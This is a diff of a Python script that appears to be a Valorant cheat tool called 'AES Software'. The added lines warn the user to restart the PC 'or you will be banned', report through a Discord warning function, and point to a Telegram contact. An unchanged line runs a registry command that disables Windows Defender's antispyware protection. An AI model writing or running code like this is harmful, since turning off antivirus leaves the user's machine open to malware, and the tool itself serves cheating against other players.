@@ -33,7 +33,28 @@ if is_valorant_running():
 else:
     print("")
 os.system('cls')
-
+os.system('cls')
+if is_first_run_after_restart():
+    print("")
+else:
+    stored_mode = get_stored_mode()
+    os.system('cls')
+    msg4xsd=cskey+" Failed to run because of loading settings already."
+    discord_warning(msg4xsd)
+    mylogo()
+    printg("---Error,a current settings has been already loaded in this current session of boot.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---RESTART PC or you will be banned.")
+    printg("---For your safety, read the above message.")
+    printg("---If you need support, contact dev on telegram: @ggbnnxfghbb ")        
+    show_message_box("You need to restart your PC for AES Software to work.", "Error", MB_OK | ICON_ERROR)
+    exit() 
 try:
     subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
     print("Command executed successfully.")
